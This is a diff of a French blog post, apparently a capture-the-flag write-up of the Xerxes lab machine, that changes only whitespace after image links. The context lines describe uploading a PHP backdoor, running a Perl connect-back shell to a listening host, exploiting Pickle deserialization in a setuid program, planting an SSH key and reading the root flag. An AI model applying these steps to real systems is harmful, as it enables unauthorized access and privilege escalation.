@@ -57,7 +57,7 @@ Juste deux ports ouverts : un SSH et un Apache 2.2. Au passage *Nmap* a lu le fi
 
 La page d'index n'affiche rien de plus que la page par défaut d'installation (*It works!*) alors on passe tout de suite sur */dev*.  
 
-![Page d'upload](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes1.png)  
+![Page d'upload](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes1.png)
 
 Il s'agit d'un ensemble de pages centrées autour d'un script d'upload. Ce dernier est protégé par mot de passe.  
 
@@ -129,7 +129,7 @@ Badaboum ! Nice guy take that ! Ça passe :D
 
 On change l'extension de notre backdoor en *.yo* et l'upload passe nickel.  
 
-![Backdoor PHP en action](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes2.png)  
+![Backdoor PHP en action](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes2.png)
 
 Maintenant ce serait bien d'avoir un shell, même s'il est basique. Alors on upload la backdoor Perl connect-back de *Data Cha0s* puis on la lance de cette manière :  
 
@@ -139,7 +139,7 @@ perl dc.pl 192.168.1.3 9999
 
 Au préalable sur notre machine (192.168.1.3) au aura mis un port en écoute avec *ncat* (ou *netcat* pour les vieux :D)  
 
-![Connect-back shell](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes3.png)  
+![Connect-back shell](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes3.png)
 
 Dans les processus on remarque qu'un *Exim* tourne. Les abonnés à *Full-Disclosure* se rapellent peut être qu'un exploit avait été écrit par *KingCope* mais après avoir testé [l'exploit](http://www.securityfocus.com/bid/45341/exploit) il semble que l'on ne soit pas dans la bonne direction.  
 
@@ -235,7 +235,7 @@ Le script *notes.py* est une espèce de gestionnaire de TODO-list qui exploite 
 
 Bien sûr il faut passer par le binaire setuid car sinon on n'accèdera pas aux notes existantes.  
 
-![Utilisation du programme de notes](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes4.png)  
+![Utilisation du programme de notes](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes4.png)
 
 Un peu au hasard on a déjà trouvé une indication qui peut nous servir pour plus tard.  
 
@@ -245,7 +245,7 @@ Heureusement je me suis rappelé que *Pickle* n'est pas considéré comme de 
 
 Le format est plutôt simple et on a pas besoin de spécifier quelque part la taille des chaînes (ce qui est le cas pour le bencodage utilisé par *BitTorrent* par exemple).  
 
-![Exploitation de notes via Pickle](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes5.png)  
+![Exploitation de notes via Pickle](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes5.png)
 
 On voit que l'on dispose de l'uid effectif de *curtiz* mais pas de son uid réel :'( Il faut donc qu'on tape juste à la première commande. On va créer une clé SSH depuis le compte *amanpour* et l'autoriser pour *curtiz* :
 
@@ -412,7 +412,7 @@ root@xerxes:/home/delacroix# cp /root/flag /var/www/dev/upload/
 root@xerxes:/home/delacroix# chmod o+r /var/www/dev/upload/flag
 ```
 
-![Flag capturé](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes6.png)  
+![Flag capturé](https://raw.githubusercontent.com/devl00p/blog/master/images/xerxes6.png)
 
 Groovy !
 
